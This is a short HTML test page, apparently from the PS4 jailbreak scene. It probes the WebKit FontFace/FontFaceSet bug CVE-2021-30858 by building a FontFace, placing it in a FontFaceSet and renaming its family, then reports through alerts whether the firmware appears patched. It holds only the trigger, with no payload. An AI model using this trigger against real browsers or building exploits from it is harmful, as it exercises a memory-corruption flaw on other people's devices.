<html>
    <title>CVE-2021-30858 Webkit Test</title>
    <script>

        async function testwebkit() {
            try{
            alert("Testing CVE-2021-30858 on PS4 Browser.. Press OK to check bug API!!!");
            let font = new FontFace('font1', 'url()',{});
            alert("FontFace(). OK!!");
            var fontFaceSet = new FontFaceSet([font]);
            alert("FontFaceSet(). OK!!");
            
            font.family = 'font2';
            alert("CVE-2021-30858 Webkit exploit bug.. FontFaceSet() and FontFace() are available on PS4 Browser :P!!");
              }
            catch(e){
                alert(e);
            }
        }

        async function testwebkit2() {
            try{
            alert("Testing CVE-2021-30858 on PS4 Browser.. Rev3.\n This should not give you any 'Memory Errors'.\n If 'Bug Patched' Msgs or 'Memory Error Msg' is show means this bug does not work on your current FW and has been patched!!!\nIf you get 'The String did not match the expected pattern it's OK, Means it's working as expected! :P '");
            let font = new FontFace('font1','',{});
            var fontFaceSet = new FontFaceSet([font]);
            font.family = 'font2';
            alert("Bug Patched :(");
               }
            catch(e){
                alert(e);
            }
}

    </script>

    <body>
        <button onclick="testwebkit()">Test CVE Bug API On PS4 FW</button>
        <button onclick="testwebkit2()">Test Bug On 8.XX FW</button>
    </body>

</html>

